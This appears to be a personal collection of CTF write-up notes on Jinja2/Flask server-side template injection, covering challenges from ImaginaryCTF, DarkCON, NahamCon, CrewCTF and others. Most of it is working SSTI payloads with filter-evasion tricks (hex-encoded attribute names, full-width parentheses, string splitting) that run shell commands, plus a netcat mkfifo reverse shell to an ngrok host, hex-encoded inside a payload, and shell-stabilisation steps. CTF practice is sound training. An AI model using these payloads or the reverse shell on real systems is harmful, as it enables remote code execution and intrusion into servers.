- ## Imaginary ctf 2021(Build-a-website):
  Problem: Web page had an input box for html code. Entering {{7*7}} reurns 49. Thus it is prone too ssti
  Initial payload: ```{{ ()|attr('__\x63\x6c\x61\x73\x73__')|attr('__\x62\x61\x73\x65__')|attr('__\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73__')() }}```
  This was interesting, the filer in the script didnt allow use of class, base or global so the attr was used instead and hexadecimal notations of class,
  base and subclasses was used which makes the payload in ascii:
  ```{{__class__.__base__.__subclasses__}}``` <br>
  The empty tuple () in the expression serves as an object from which we can start chaining attribute lookups <br>
  the | operator is used to chain these filters together, applying each one in sequence to transform the value step by step. <br>

  This gives a list of all the modules. Index of ```<class 'subprocess.Popen'>``` at 360.

  Final payload: ```{{()|attr('__\x63\x6c\x61\x73\x73__')|attr('__\x62\x61\x73\x65__')|attr('__\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73__')()|attr('__getitem__')(360)("cat flag.txt",shell=True,stdout=-1)|attr('communicate')()}}```

- ## Imaginary ctf 2021(Sinking calculator): 
![image](https://github.com/poorvi1910/Web/assets/146640913/f78f996d-601d-45c4-a6dc-35fb80e43e82)
In this code, the input length is limited to 80 chars and output is only printed if it has numbers or minus.
Payload: ```calc?query=config.class.init.globals[%27os%27].popen(%27od%20-b%20-An%20fla*%27).read()``` <br>
translates to ```config.class.init.globals['os'].popen('od -b -An fla*').read()```. The command ```od -b -An fla*``` is used to display file contents in octal format, without displaying the filename (-An)
  - od: This is the "octal dump" command, which is used to display file contents in different formats (octal, hexadecimal, decimal, ASCII, etc.).
  - b: This option tells od to display the output in octal bytes. Each byte in the file(s) will be displayed as a three-digit octal number.
  - An: This option tells od to suppress the default output of file offsets. Normally, od prefixes each line of output with the byte offset of that line within the file. -An removes these offsets from the output.
  - fla*: This is a shell glob pattern. It matches any files in the current directory whose names start with "fla". For example, it could match files like "flag.txt", "flag1.txt", etc.<br>
The ouput gives a string of numbers which when converted from octal to ascii gives the flag.

- ## DarkCON CTF 2021(DMM):

The following payload will return all subclasses.

```{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}```

The following payload will return the output of the id command.

```{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('strip')()}}```

```
<div style = "text-align:center">
<h1>Oops! b&#39;app.py\nflag.txt\nrequirements.txt&#39; is 404 Not Found.</h1>
</div>
```
Listing the directory content with the following payload.

```{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('strip')()}}```
```
<div style = "text-align:center">
<h1>Oops! b&#39;app.py\nflag.txt\nrequirements.txt&#39; is 404 Not Found.</h1>
</div>
```
And printing flag.txt file.

```{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('cat flag.txt',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('strip')()}}```
```
<div style = "text-align:center">
<h1>Oops! b&#39;darkCON{w0ww_y0u_ar3_sUp3er_h4ckeR_ggwpp_!!}&#39; is 404 Not Found.</h1>
</div>
```

- ## (Unkown ctf)
  This chall required a payload with '' blacklisted
  Payload: ``` {{url_for.__globals__.os.popen(request.headers.hack).read()}}```
  It was required to supply the executable commands in the request header named ‘hack’. To achieve this, intercept the form’s POST request using Burp 
  Suite and modify the parameters accordingly.
```
GET /{{url_for.__globals__.os.popen(request.headers.hack).read()}} HTTP/1.1
hack: cat ../flag.txt
Host: chal.pctf.competitivecyber.club:5555
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://chal.pctf.competitivecyber.club:5555/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
- ## Nahamcon 2022(Deafcon):
  In this challenge, parenthesis were blacklistyed which means that any python command could not be executed. The way around this was to use full width parenthesis intead of half width which would serve the purpose and all bypass the filter.
 Final payload:```"{{ self._TemplateReferencecontext.cycler.init.globals__.os.popen（'cat flag.txt'）.read（）}}"@aaa.com```
This payload was inserted into the email field and flag was obtained

- ## Crewctf 2022 (Ezchall):
  Blocks:
  ```if input.count('.') > 1 or input.count(':') > 1 or input.count('/') > 1 :```
limited payload size: ```if len(input) < 115```
can’t use digits so we can’t bypass the blacklist with Unicode.
```
if char in string.digits:
	return False
```
Finally, the blacklist.
```UNALLOWED = [
 'class', 'mro', 'init', 'builtins', 'request', 'app','sleep', 'add', '+', 'config', 'subclasses', 'format', 'dict', 'get', 'attr', 'globals', 'time', 'read', 'import', 'sys', 'cookies', 'headers', 'doc', 'url', 'encode', 'decode', 'chr', 'ord', 'replace', 'echo', 'base', 'self', 'template', 'print', 'exec', 'response', 'join', 'cat', '%s', '{}', '\\', '*', '&',"{{", "}}", '[]',"''",'""','|','=','~']
```

Approach:
  - {{ and }} are filtered, so we’ll probably use {%
  - cycler.__init__.__globals__.os.popen('id').read()
  - to make it easier to deal with blacklisted words and also the count of dots,changed it to this format: ```cycler['__init__']['__globals__']['os']['popen']('id')['read']()```
  - we need to us an empty space between the blacklisted strings: ```cycler['__in' 'it__']['__glo' 'bals__']['os']['popen']('id')['rea' 'd']()```
  - The only problem here, is that we’re exceeding the length limit. Solution was using lipsum.: ```lipsum['__glo' 'bals__']['os']['popen']('tail /flag')['re' 'ad']()```

- ## Imaginary CTF (Almost SSTI)
The inteersting thing here was that payload ccould only be 2 bytes long
```
#!/usr/bin/env python3

from flask import Flask, render_template_string, request, Response  

app = Flask(__name__)

@app.route('/')
def index():
    return Response(open(__file__).read(), mimetype='text/plain')

@app.route('/ssti')
def ssti():
    query = request.args['query']
    if len(query) > 2:
        return "Too long!"
    return render_template_string(query)

app.run('0.0.0.0', 3002, debug=True)
```
The only thing we can do is cause an error with {{
Since debug mode is enabled, we can open a Python interactive console on this page (clicking on the console icon button). So we have Remote Code Execution and thus can read the flag:
![image](https://github.com/poorvi1910/Web/assets/146640913/82f46e42-f033-418d-815b-86f5583a3949)

- ## Nahamcon ctf 2023

When changing the value to an SSTI polyglot, ${{<%[%'"}}%\, we get an error message.
```
HACKER DETECTED!!!!
The folowing are not allowed: [ {{\s*config\s*}},.*class.*,.*mro.*,.*import.*,.*builtins.*,.*popen.*,.*system.*,.*eval.*,.*exec.*,.*\..*,.*\[.*,.*\].*,.*\_\_.* ]
```
Resources mentioned in the writeup:
Bypasses: https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#accessing-subclasses-with-bypasses
More bypasses here: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
It's blocked due to builtin and popen, so let's go through it manually.
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
```
We can use hex or concatenation to bypass the filter.
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuil'+'tins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimp'+'ort\x5f\x5f')('os')|attr('pop'+'en')('id')|attr('read')()}}
```
We don't get output.. let's hex encode a reverse shell.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 8.tcp.ngrok.io 15723 >/tmp/f
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuil'+'tins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimp'+'ort\x5f\x5f')('os')|attr('pop'+'en')('\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x63\x61\x74\x20\x2f\x74\x6d\x70\x2f\x66\x7c\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x20\x32\x3e\x26\x31\x7c\x6e\x63\x20\x38\x2e\x74\x63\x70\x2e\x6e\x67\x72\x6f\x6b\x2e\x69\x6f\x20\x31\x35\x37\x32\x33\x20\x3e\x2f\x74\x6d\x70\x2f\x66')|attr('read')()}}
```
Make the shell interactive.
```
python3 -c 'import pty;pty.spawn("/bin/bash");'
CTRL+Z
stty raw -echo; fg; 
export TERM=linux;clear;
```
Check the database folder.
```
cd DB
strings *
```
We find the flag!
```
flag{7b5b91c60796488148ddf3b227735979}
```

- ##


- ##
